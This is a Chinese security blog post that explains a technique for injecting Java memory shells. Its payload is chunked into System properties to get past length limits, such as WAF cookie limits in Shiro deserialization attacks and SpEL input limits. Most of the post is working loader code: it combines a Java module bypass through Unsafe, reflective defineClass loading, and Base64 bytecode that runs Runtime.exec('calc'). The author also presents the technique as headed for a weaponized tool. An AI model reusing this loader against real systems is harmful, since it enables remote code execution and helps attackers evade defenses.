---
title: 分块传输打内存马
url: https://mp.weixin.qq.com/s/5Y-fX2VaQ1reRi_KcIB1Cw
source: Doonsec's feed
date: 2026-01-17
fetch_date: 2026-01-18T03:37:07.681878
---

# 分块传输打内存马

![cover_image](https://mmbiz.qpic.cn/sz_mmbiz_jpg/xVRYUEtHibmvbGncYjyEMVYjGrsxkHWNRB8DHviaia1h7EXJj5s4cXLv4s1N3VC1ice1RZUBx9JxicPeOC6rdebyhPg/0?wx_fmt=jpeg)

# 分块传输打内存马

原创

ptr
ptr

UpRoot

![]()

在小说阅读器中沉浸阅读

针对一些限制字符长度的打内存马场景，常用的思想是分离加载内存马，但最近学习到一种分块传输的思想，本质上是借助“全局变量”来存储字节码。

来看下我写的这段代码，其实现了JDK全版本动态加载字节码：

```
package com;

import org.apache.shiro.codec.Base64;

import java.io.IOException;
import java.lang.reflect.Field;
import java.lang.reflect.InvocationTargetException;
import java.lang.reflect.Method;
import java.nio.file.Files;
import java.nio.file.Paths;

publicclass test {

    static {

        try{
            bypassModule();
            System.setProperty("a", "yv66vgAAADQAIwoACQATCgAUABUIABYKABQAFwcAGAcAGQoABgAaBwAbBwAcAQAGPGluaXQ+AQADKClWAQAEQ29k");
            System.setProperty("b", "ZQEAD0xpbmVOdW1iZXJUYWJsZQEACDxjbGluaXQ+AQANU3RhY2tNYXBUYWJsZQcAGAEAClNvdXJjZUZpbGUBAAlD");
            System.setProperty("c", "YWxjLmphdmEMAAoACwcAHQwAHgAfAQAEY2FsYwwAIAAhAQATamF2YS9pby9JT0V4Y2VwdGlvbgEAGmphdmEvbGFu");
            System.setProperty("d", "Zy9SdW50aW1lRXhjZXB0aW9uDAAKACIBAARDYWxjAQAQamF2YS9sYW5nL09iamVjdAEAEWphdmEvbGFuZy9SdW50");
            System.setProperty("e", "aW1lAQAKZ2V0UnVudGltZQEAFSgpTGphdmEvbGFuZy9SdW50aW1lOwEABGV4ZWMBACcoTGphdmEvbGFuZy9TdHJp");
            System.setProperty("f", "bmc7KUxqYXZhL2xhbmcvUHJvY2VzczsBABgoTGphdmEvbGFuZy9UaHJvd2FibGU7KVYAIQAIAAkAAAAAAAIAAQAK");
            System.setProperty("g", "AAsAAQAMAAAAHQABAAEAAAAFKrcAAbEAAAABAA0AAAAGAAEAAAADAAgADgALAAEADAAAAFQAAwABAAAAF7gAAhID");
            System.setProperty("h", "tgAEV6cADUu7AAZZKrcAB7+xAAEAAAAJAAwABQACAA0AAAAWAAUAAAAGAAkACQAMAAcADQAIABYACgAPAAAABwACTAcAEAkAAQARAAAAAgAS");

            StringBuilder sb = new StringBuilder();
            for (int i = 0; i < 8; i++) {
                char key = (char) ('a' + i);
                String part = System.getProperty(String.valueOf(key));
                if (part != null) {
                    sb.append(part);
                }
            }
            String payload = sb.toString();
            byte[] var14 = Base64.decode(payload);
            Method var15 = ClassLoader.class.getDeclaredMethod("defineClass", byte[].class, Integer.TYPE, Integer.TYPE);
            var15.setAccessible(true);
            Class var16 = (Class)var15.invoke(test.class.getClassLoader(), var14, new Integer(0), new Integer(var14.length));
            var16.newInstance();
            System.out.println(payload);
        }catch (Exception e){

        }
    }

    public static void main(String[] args) {
        System.out.println(
                1
        );
    }

    public static void bypassModule(){
        Object var3;
        Object var4;
        try {
            Class var1 = Class.forName("sun.misc.Unsafe");
            Field var2 = var1.getDeclaredField("theUnsafe");
            var2.setAccessible(true);
            var3 = var2.get((Object)null);
            var4 = Class.class.getMethod("getModule").invoke(Object.class, (Object[])null);
            Method var5 = var3.getClass().getMethod("objectFieldOffset", Field.class);
            Long var6 = (Long)var5.invoke(var3, Class.class.getDeclaredField("module"));
            Method var7 = var3.getClass().getMethod("getAndSetObject", Object.class, Long.TYPE, Object.class);
            var7.invoke(var3, test.class, var6, var4);
        } catch (Exception var10) {
        }
    }
}
```

其借助`System.setProerty()`设置系统属性，通过写一个简单的脚本可以将内存马切割成8份，然后将每一份存入系统属性，后续通过反射拿到`defineClass`来进行动态加载字节码，从而实现远程代码执行。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/xVRYUEtHibmvbGncYjyEMVYjGrsxkHWNR83BN5XFBw4WCMpOQTXVlUReu0MicxP2ztleibbLzhMaOO0zHDOzprHUQ/640?wx_fmt=png&from=appmsg)

这种手法的应用场景可以是Shiro反序列化打内存马过waf对cookie长度的限制，可以是Spel表达式打内存马过1w字符的限制等。

具体的武器化，我将在几天后发出来，封装到工具中来实现，大幅度降低利用的复杂度。

- END -

预览时标签不可点

![]()

微信扫一扫
关注该公众号

继续滑动看下一个

轻触阅读原文

![](http://mmbiz.qpic.cn/sz_mmbiz_png/xVRYUEtHibmvaoURJ0GJicia6k2fibfoowzduKTIkiaiaEF2Z2jrzjeX9JaCet9jpQRba16OImWqgkwEuNtibYlTjsoQA/0?wx_fmt=png)

UpRoot

向上滑动看下一个

知道了

![]()
微信扫一扫
使用小程序

取消
允许

取消
允许

取消
允许

×
分析

![跳转二维码]()

![作者头像](http://mmbiz.qpic.cn/sz_mmbiz_png/xVRYUEtHibmvaoURJ0GJicia6k2fibfoowzduKTIkiaiaEF2Z2jrzjeX9JaCet9jpQRba16OImWqgkwEuNtibYlTjsoQA/0?wx_fmt=png)

微信扫一扫可打开此内容，
使用完整服务

：
，
，
，
，
，
，
，
，
，
，
，
，
。

视频
小程序
赞
，轻点两下取消赞
在看
，轻点两下取消在看
分享
留言
收藏
听过